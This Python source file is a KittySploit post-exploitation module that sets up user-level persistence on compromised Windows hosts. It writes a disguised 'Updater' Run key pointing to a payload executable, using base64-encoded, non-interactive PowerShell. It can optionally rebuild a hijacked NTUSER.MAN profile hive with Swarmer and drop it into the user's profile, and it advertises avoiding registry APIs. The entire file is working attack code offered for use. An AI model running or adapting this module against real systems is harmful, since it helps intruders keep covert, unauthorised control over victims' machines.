#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.post.file import File
from lib.post.windows.registry import Registry

# Run key path (Swarmer C#: SOFTWARE\Microsoft\Windows\CurrentVersion\Run under HKCU)
RUN_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
RUN_KEY_PARTS = ["Software", "Microsoft", "Windows", "CurrentVersion", "Run"]
REG_HEADER = "Windows Registry Editor Version 5.00"
REG_SZ = "REG_SZ"


def _reg_escape_value(s):
    """Escape backslashes for .reg string value."""
    return s.replace("\\", "\\\\")


class RegKey:
    """Registry key (Swarmer-inspired: RegistryKeyInfo). Name, values {name -> (type, data)}, subkeys {name -> RegKey}."""

    def __init__(self, name=""):
        self.name = name
        self.values = {}   # value_name -> (type_str, data_str)
        self.subkeys = {}  # key_name (case-insensitive lookup) -> RegKey

    def get_or_create_subkey(self, part):
        for k, v in self.subkeys.items():
            if k.lower() == part.lower():
                return v
        key = RegKey(part)
        self.subkeys[part] = key
        return key

    def set_value(self, value_name, value_type, data):
        self.values[value_name] = (value_type, data)

    def remove_value(self, value_name):
        name_lower = value_name.lower()
        for k in list(self.values.keys()):
            if k.lower() == name_lower:
                del self.values[k]
                return


def _parse_reg_file(content):
    """
    Parse .reg file into (header, root RegKey for HKEY_CURRENT_USER).
    Sections [HKEY_CURRENT_USER\\...] and values "name"="value" or @="value".
    """
    header = REG_HEADER + "\r\n"
    root = RegKey("HKEY_CURRENT_USER")
    lines = content.replace("\r\n", "\n").replace("\r", "\n").split("\n")
    i = 0
    if lines and "Windows Registry" in lines[0]:
        header = lines[0] + "\r\n"
        i = 1
    while i < len(lines):
        line = lines[i]
        i += 1
        stripped = line.strip()
        if not stripped or stripped.startswith(";"):
            continue
        if stripped.startswith("["):
            # Section: [HKEY_CURRENT_USER\Software\...]
            end = stripped.index("]") if "]" in stripped else len(stripped)
            path = stripped[1:end].strip()
            if not path.upper().startswith("HKEY_CURRENT_USER"):
                continue
            path = path.replace("HKEY_CURRENT_USER\\", "").replace("HKEY_CURRENT_USER/", "")
            parts = [p for p in path.replace("/", "\\").split("\\") if p]
            current = root
            for part in parts:
                current = current.get_or_create_subkey(part)
            # Read values until next section or EOF
            while i < len(lines):
                line = lines[i]
                i += 1
                s = line.strip()
                if not s or s.startswith(";"):
                    continue
                if s.startswith("["):
                    i -= 1
                    break
                # Value: "Name"="value" or @="value"
                eq = s.find("=")
                if eq < 0:
                    continue
                name_part = s[:eq].strip().strip('"')
                val_part = s[eq + 1:].strip()
                if name_part == "@":
                    name_part = ""
                if val_part.startswith('"') and val_part.endswith('"'):
                    val_part = val_part[1:-1].replace("\\\\", "\\")
                elif val_part.upper().startswith("hex:"):
                    val_part = val_part
                current.set_value(name_part, REG_SZ, val_part)
    return header, root


def _add_startup_entry(root, key_name, key_value):
    """
    Add startup entry to Run key (Swarmer C# AddStartupEntry).
    Path: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.
    Remove existing value with same name, add REG_SZ value.
    """
    current = root
    for part in RUN_KEY_PARTS:
        current = current.get_or_create_subkey(part)
    current.remove_value(key_name)
    current.set_value(key_name, REG_SZ, key_value)


def _emit_reg(header, root, prefix="HKEY_CURRENT_USER"):
    """Emit .reg content from tree (depth-first)."""
    out = [header.rstrip(), ""]

    def emit_key(key, path_parts):
        if key.values:
            full_path = prefix + "\\" + "\\".join(path_parts) if path_parts else prefix
            out.append(f"[{full_path}]")
            for vname, (vtype, vdata) in sorted(key.values.items(), key=lambda x: (x[0].lower() == "", x[0].lower())):
                if vname == "":
                    out.append(f'@="{_reg_escape_value(vdata)}"')
                else:
                    out.append(f'"{vname}"="{_reg_escape_value(vdata)}"')
            out.append("")
        for skey in sorted(key.subkeys.keys(), key=str.lower):
            emit_key(key.subkeys[skey], path_parts + [skey])

    emit_key(root, [])
    return "\r\n".join(out).rstrip() + "\r\n"


class Module(Post, File, Registry):
    __info__ = {
        "name": "Swarmer NTUSER.MAN persistence (Windows)",
        "description": (
            "Export HKCU, inject a Run key for persistence, optionally run Swarmer to build NTUSER.MAN "
            "and drop it into %USERPROFILE%. User-level; no Reg* APIs when using Swarmer."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.SHELL, SessionType.METERPRETER],
        "references": [
            "Swarmer workflow (RegLoadAppKeyW + Offreg)",
        ],
    }

    session_id = OptString("", "Session ID (shell or meterpreter)", True)
    startup_key = OptString("Updater", "Run key name for persistence", True)
    startup_value = OptString("", "Full path to payload executable (e.g. C:\\Path\\To\\payload.exe)", True)
    swarmer_path = OptString("", "Path to swarmer.exe on target (empty = only export and inject .reg)", False)
    temp_dir = OptString("%TEMP%", "Directory on target for exported .reg and NTUSER.MAN", False)
    drop_ntuser = OptBool(True, "Copy NTUSER.MAN to %USERPROFILE% after conversion", False)

    def _get_session_id_value(self) -> str:
        return str(self.session_id or "").strip()

    def _is_valid_session(self) -> bool:
        sid = self._get_session_id_value()
        if not sid or not self.framework or not hasattr(self.framework, "session_manager"):
            return False
        session = self.framework.session_manager.get_session(sid)
        if not session:
            return False
        st = getattr(session, "session_type", "") or ""
        s = str(st).lower()
        return s in (SessionType.SHELL.value.lower(), SessionType.METERPRETER.value.lower())

    def check(self):
        if not self._get_session_id_value():
            return False
        if not self._is_valid_session():
            return False
        key = str(self.startup_key or "").strip()
        val = str(self.startup_value or "").strip()
        if not key or not val:
            return False
        return True

    def _execute(self, command: str, description: str = None) -> str:
        if description:
            print_status(description)
        out = self.cmd_execute(command)
        return (out or "").strip()

    def _expand_target_path(self, path: str) -> str:
        """Expand environment variables on the target (e.g., %TEMP%) using cmd.exe."""
        p = str(path or "").strip()
        if not p:
            return p

        # If it looks like a previously stored PowerShell expression, extract the inner path
        if p.lower().startswith("[environment]::expandenvironmentvariables(") and p.endswith(")"):
            # Extract the path from inside the PowerShell expression
            inner = p[len("[environment]::expandenvironmentvariables("):-1].strip()
            if inner.startswith("'") and inner.endswith("'"):
                inner = inner[1:-1]
            elif inner.startswith('"') and inner.endswith('"'):
                inner = inner[1:-1]
            p = inner

        if "%" not in p:
            return p

        # Use cmd.exe /c echo to expand environment variables - this is the most reliable method
        cmd = f'cmd.exe /c echo {p}'
        out = self._execute(cmd, None)
        
        # Parse output: get last non-empty line that doesn't look like a command echo
        if out:
            lines = [line.strip() for line in out.splitlines() if line.strip()]
            for line in reversed(lines):
                # Skip lines that look like command echoes
                if line.lower().startswith("cmd.exe") or line.lower().startswith("echo "):
                    continue
                # Skip lines that still contain unexpanded %VAR% (means failure)
                if "%" in line:
                    continue
                return line
        
        # Fallback: return original path
        return p

    def _resolve_temp_dir(self) -> str:
        raw = str(self.temp_dir or "%TEMP%").strip()
        if not raw:
            return ""
        # Expand env vars on target (handles %TEMP% default)
        expanded = self._expand_target_path(raw)
        return expanded.strip().rstrip("\\/")

    def _path_exists(self, path: str) -> bool:
        """Check if a path exists on the target using cmd.exe if exist."""
        p = self._expand_target_path(path)
        # Use cmd.exe if exist for reliability
        cmd = f'cmd.exe /c if exist "{p}" (echo PATH_EXISTS_YES) else (echo PATH_EXISTS_NO)'
        res = self._execute(cmd, None)
        return "PATH_EXISTS_YES" in (res or "")

    def _export_hkcu_reg(self, reg_path: str) -> bool:
        """Export HKCU to a .reg file on the target."""
        print_status("Exporting HKCU to .reg file...")
        
        # Use the original raw temp path with %TEMP% to avoid escaping issues
        # reg.exe handles %TEMP% expansion natively
        raw_reg_path = "%TEMP%\\swarmer_export.reg"
        
        # Use reg.exe directly - it will expand %TEMP% itself
        cmd = f'cmd.exe /c reg export HKCU {raw_reg_path} /y'
        out = self._execute(cmd, None)
        out = (out or "").strip()
        
        # Debug: show what the export command returned
        if out:
            # Only show first 200 chars to avoid flooding
            preview = out[:200] + "..." if len(out) > 200 else out
            print_info(f"Export output: {preview}")
        
        # Check for error keywords (French and English)
        error_keywords = ["error", "erreur", "impossible", "denied", "refusé"]
        out_lower = out.lower()
        if any(kw in out_lower for kw in error_keywords):
            print_warning(f"Export may have failed: {out}")
            return False
        
        # Give some time for file to be written (reg export can be slow for large HKCU)
        import time
        time.sleep(2)
        
        # Verify the file really exists using the resolved path
        if not self._path_exists(reg_path):
            # Also check with the raw path
            raw_check = f'cmd.exe /c if exist {raw_reg_path} (echo PATH_EXISTS_YES) else (echo PATH_EXISTS_NO)'
            raw_res = self._execute(raw_check, None)
            if "PATH_EXISTS_YES" in (raw_res or ""):
                print_success("HKCU exported (verified with raw path).")
                return True
            
            # Try to list the temp directory to debug
            list_cmd = 'cmd.exe /c dir %TEMP%\\swarmer*.reg /b 2>nul'
            dir_out = self._execute(list_cmd, None)
            print_warning(f"Export reported success but file not found at: {reg_path}")
            if dir_out and dir_out.strip():
                print_info(f"Found reg files: {dir_out.strip()}")
            return False
        print_success("HKCU exported.")
        return True

    def _build_run_key_reg_content(self) -> str:
        """Build .reg block for Run key (fallback when parser not used)."""
        key_name = str(self.startup_key or "Updater").strip()
        path_val = str(self.startup_value or "").strip()
        path_escaped = _reg_escape_value(path_val)
        section = "HKEY_CURRENT_USER\\" + RUN_KEY_PATH
        lines = [f"[{section}]", f'"{key_name}"="{path_escaped}"', ""]
        return "\r\n".join(lines)

    def _inject_run_key_into_reg_content(self, content: str) -> str:
        """
        Parse .reg (Swarmer-inspired), add startup entry in tree, re-emit .reg.
        Fallback: append Run key block if parse fails.
        """
        startup_key = str(self.startup_key or "Updater").strip()
        startup_value = str(self.startup_value or "").strip()
        try:
            header, root = _parse_reg_file(content)
            _add_startup_entry(root, startup_key, startup_value)
            return _emit_reg(header, root)
        except Exception:
            run_block = self._build_run_key_reg_content()
            section = "HKEY_CURRENT_USER\\" + RUN_KEY_PATH
            if section in content and startup_key in content:
                return content
            return content.rstrip() + "\r\n" + run_block

    def _write_reg_file_on_target(self, reg_path: str, content: str) -> bool:
        """Write .reg content on target via PowerShell (base64 to avoid escaping)."""
        import base64 as _b64
        reg_path = self._expand_target_path(reg_path)
        b64 = _b64.b64encode(content.encode("utf-16le")).decode("ascii")
        chunk_size = 4000
        chunks = [b64[i : i + chunk_size] for i in range(0, len(b64), chunk_size)]
        temp_b64 = "[Environment]::GetFolderPath('LocalApplicationData')+'\\Temp\\swarmer_reg.b64'"
        for i, chunk in enumerate(chunks):
            chunk_esc = chunk.replace("'", "''")
            if i == 0:
                script = f"Set-Content -LiteralPath ({temp_b64}) -Value '{chunk_esc}' -NoNewline"
            else:
                script = f"Add-Content -LiteralPath ({temp_b64}) -Value '{chunk_esc}' -NoNewline"
            script_esc = script.replace("'", "''")
            cmd = f"powershell -NoP -NonI -Command \"{script_esc}\""
            self._execute(cmd, None)
        reg_path_ps = reg_path.replace("\\", "\\\\").replace("'", "''")
        decode_and_save = (
            f"$b=[IO.File]::ReadAllText({temp_b64}); "
            f"$bytes=[Convert]::FromBase64String($b); "
            f"$decoded=[Text.Encoding]::Unicode.GetString($bytes); "
            f"[IO.File]::WriteAllText('{reg_path_ps}', $decoded)"
        )
        script_esc = decode_and_save.replace("'", "''")
        cmd = f"powershell -NoP -NonI -Command '{script_esc}'"
        out = self._execute(cmd, "Writing modified .reg file on target...")
        if "Exception" in out or "Error" in out:
            print_warning(f"Write may have failed: {out}")
            return False
        print_success("Modified .reg file written.")
        return True

    def _read_reg_file_from_target(self, reg_path: str) -> str:
        """Read .reg file content from target."""
        # Use %TEMP% directly to avoid path issues
        raw_reg_path = "%TEMP%\\swarmer_export.reg"
        
        # First verify file exists
        check_cmd = f'cmd.exe /c if exist {raw_reg_path} (echo FILE_OK) else (echo FILE_NOTFOUND)'
        check_res = self._execute(check_cmd, None)
        if "FILE_NOTFOUND" in (check_res or "") or "FILE_OK" not in (check_res or ""):
            print_warning("Exported .reg file not found for reading")
            return ""
        
        # Read using PowerShell with proper encoding - output to temp file then read
        # Use a marker to identify our output
        read_script = (
            f"$content = [IO.File]::ReadAllText([Environment]::ExpandEnvironmentVariables('{raw_reg_path}'), [Text.Encoding]::Unicode); "
            f"Write-Output 'REG_CONTENT_START'; "
            f"Write-Output $content; "
            f"Write-Output 'REG_CONTENT_END'"
        )
        import base64 as _b64
        encoded = _b64.b64encode(read_script.encode("utf-16le")).decode("ascii")
        cmd = f"powershell -NoP -NonI -EncodedCommand {encoded}"
        out = self._execute(cmd, None)
        
        # Extract content between markers
        if out and "REG_CONTENT_START" in out and "REG_CONTENT_END" in out:
            start_idx = out.find("REG_CONTENT_START") + len("REG_CONTENT_START")
            end_idx = out.find("REG_CONTENT_END")
            content = out[start_idx:end_idx].strip()
            if content and ("[HKEY_" in content or "Windows Registry" in content):
                return content
        
        # Fallback: try simpler approach - just check for registry header in output
        if out and ("[HKEY_" in out or "Windows Registry" in out):
            # Find the start of registry content
            for marker in ["Windows Registry Editor", "[HKEY_"]:
                if marker in out:
                    idx = out.find(marker)
                    return out[idx:]
        
        # Last resort: use cmd type (may have encoding issues but worth trying)
        type_cmd = f'cmd.exe /c type {raw_reg_path}'
        type_out = self._execute(type_cmd, None)
        if type_out and ("[HKEY_" in type_out or "Windows Registry" in type_out):
            for marker in ["Windows Registry Editor", "[HKEY_"]:
                if marker in type_out:
                    idx = type_out.find(marker)
                    return type_out[idx:]
        
        return ""

    def _run_swarmer(self, reg_path: str, ntuser_path: str) -> bool:
        """Run swarmer.exe on target: reg -> NTUSER.MAN."""
        swarmer = str(self.swarmer_path or "").strip()
        if not swarmer:
            return False
        key = str(self.startup_key or "Updater").strip()
        val = str(self.startup_value or "").strip()
        # Swarmer: swarmer.exe [--startup-key "X" --startup-value "path"] input.reg NTUSER.MAN
        args = f'--startup-key "{key}" --startup-value "{val}" "{reg_path}" "{ntuser_path}"'
        cmd = f'"{swarmer}" {args}'
        out = self._execute(cmd, "Running Swarmer (reg -> NTUSER.MAN)...")
        if "error" in out.lower() or "exception" in out.lower():
            print_warning(f"Swarmer output: {out}")
            return False
        print_success("Swarmer completed.")
        return True

    def _copy_to_userprofile(self, ntuser_path: str) -> bool:
        """Copy NTUSER.MAN to %USERPROFILE%."""
        cmd = f'copy /Y "{ntuser_path}" "%USERPROFILE%\\NTUSER.MAN"'
        out = self._execute(cmd, "Copying NTUSER.MAN to %USERPROFILE%...")
        if "1 file(s) copied" not in out and "copied" not in out.lower():
            print_warning(f"Copy result: {out}")
            return False
        print_success("NTUSER.MAN dropped to %USERPROFILE%.")
        return True

    def run(self):
        try:
            sid = self._get_session_id_value()
            if not sid:
                raise ProcedureError(FailureType.ConfigurationError, "Session ID is required")
            if not self._is_valid_session():
                raise ProcedureError(
                    FailureType.ConfigurationError,
                    "This module requires a shell or meterpreter session.",
                )

            startup_key = str(self.startup_key or "Updater").strip()
            startup_value = str(self.startup_value or "").strip()
            # Strip surrounding quotes if present (user might include them)
            if startup_key.startswith('"') and startup_key.endswith('"'):
                startup_key = startup_key[1:-1]
            if startup_key.startswith("'") and startup_key.endswith("'"):
                startup_key = startup_key[1:-1]
            if startup_value.startswith('"') and startup_value.endswith('"'):
                startup_value = startup_value[1:-1]
            if startup_value.startswith("'") and startup_value.endswith("'"):
                startup_value = startup_value[1:-1]
            if not startup_key or not startup_value:
                raise ProcedureError(
                    FailureType.ConfigurationError,
                    "startup_key and startup_value are required for persistence.",
                )

            temp_dir = self._resolve_temp_dir()
            if not temp_dir:
                raise ProcedureError(FailureType.ConfigurationError, "Could not resolve temp directory on target")
            reg_path = self._expand_target_path(temp_dir + "\\swarmer_export.reg")
            ntuser_path = self._expand_target_path(temp_dir + "\\NTUSER.MAN")

            print_status("Swarmer-based persistence (NTUSER.MAN)")
            print_info(f"Run key: {startup_key} -> {startup_value}")
            print_info(f"Using temp dir: {temp_dir}")
            print_info(f".reg path: {reg_path}")

            # Step 1: Add Run key directly to registry (simple and reliable)
            if not self._add_run_key_directly(startup_key, startup_value):
                raise ProcedureError(FailureType.Unknown, "Failed to add Run key to registry")

            swarmer_path_val = str(self.swarmer_path or "").strip()
            if swarmer_path_val:
                # Step 2: Export HKCU for Swarmer
                if not self._export_hkcu_reg(reg_path):
                    raise ProcedureError(FailureType.Unknown, "Failed to export HKCU for Swarmer")
                
                # Step 3: Run Swarmer
                if not self._run_swarmer(reg_path, ntuser_path):
                    raise ProcedureError(FailureType.Unknown, "Swarmer failed. Ensure swarmer.exe is at the given path.")
                
                # Step 4: Drop to %USERPROFILE%
                if self.drop_ntuser:
                    if not self._copy_to_userprofile(ntuser_path):
                        print_warning("Copy to %USERPROFILE% may have failed; check manually.")
            else:
                print_info("swarmer_path is empty: Run key was added directly to registry.")
                print_info("The persistence is active immediately via the Run key.")
                print_info(
                    "If you also need NTUSER.MAN persistence, provide swarmer_path and run again, or:\n"
                    f'  reg export HKCU %TEMP%\\hkcu.reg /y\n'
                    f'  swarmer.exe --startup-key "{startup_key}" --startup-value "{startup_value}" '
                    f'%TEMP%\\hkcu.reg %TEMP%\\NTUSER.MAN\n'
                    f'  copy /Y %TEMP%\\NTUSER.MAN "%USERPROFILE%\\NTUSER.MAN"'
                )

            return True

        except ProcedureError:
            raise
        except Exception as e:
            raise ProcedureError(FailureType.Unknown, str(e))

    def _add_run_key_directly(self, key_name: str, key_value: str) -> bool:
        """Add a Run key directly using PowerShell (more reliable than reg.exe through shell)."""
        print_status("Adding Run key directly via PowerShell...")
        
        # Use PowerShell with base64 encoding to avoid all escaping issues
        import base64 as _b64
        
        # PowerShell script to add the registry key
        # Escape any quotes in key_name and key_value for PowerShell
        safe_name = key_name.replace('"', '`"').replace("'", "''")
        safe_value = key_value.replace('"', '`"').replace("'", "''")
        
        ps_script = f'''
$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$name = "{safe_name}"
$value = "{safe_value}"
try {{
    if (-not (Test-Path $regPath)) {{
        New-Item -Path $regPath -Force | Out-Null
    }}
    Set-ItemProperty -Path $regPath -Name $name -Value $value -Type String -Force
    Write-Output "SUCCESS_REG_ADD"
}} catch {{
    Write-Output "ERROR_REG_ADD: $($_.Exception.Message)"
}}
'''
        
        # Encode the script to avoid any escaping issues
        encoded = _b64.b64encode(ps_script.encode("utf-16le")).decode("ascii")
        cmd = f"powershell -NoP -NonI -EncodedCommand {encoded}"
        
        # Debug: show what we're doing
        print_info(f"Executing PowerShell to add: {key_name} -> {key_value}")
        
        out = self._execute(cmd, None)
        out = (out or "").strip()
        
        if out:
            # Filter to find our markers
            for line in out.splitlines():
                if "SUCCESS_REG_ADD" in line:
                    print_success(f"Run key added: {key_name} -> {key_value}")
                    return True
                if "ERROR_REG_ADD" in line:
                    print_warning(f"PowerShell error: {line}")
                    return False
        
        # Verify by querying the registry
        verify_script = f'''
$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$name = "{safe_name}"
try {{
    $val = Get-ItemPropertyValue -Path $regPath -Name $name -ErrorAction Stop
    Write-Output "VERIFY_OK:$val"
}} catch {{
    Write-Output "VERIFY_FAIL"
}}
'''
        encoded_verify = _b64.b64encode(verify_script.encode("utf-16le")).decode("ascii")
        verify_cmd = f"powershell -NoP -NonI -EncodedCommand {encoded_verify}"
        verify_out = self._execute(verify_cmd, None)
        
        if verify_out and "VERIFY_OK" in verify_out:
            print_success(f"Run key verified: {key_name}")
            return True
        
        print_warning(f"Could not verify Run key. Output: {out[:200] if out else '(empty)'}")
        return False

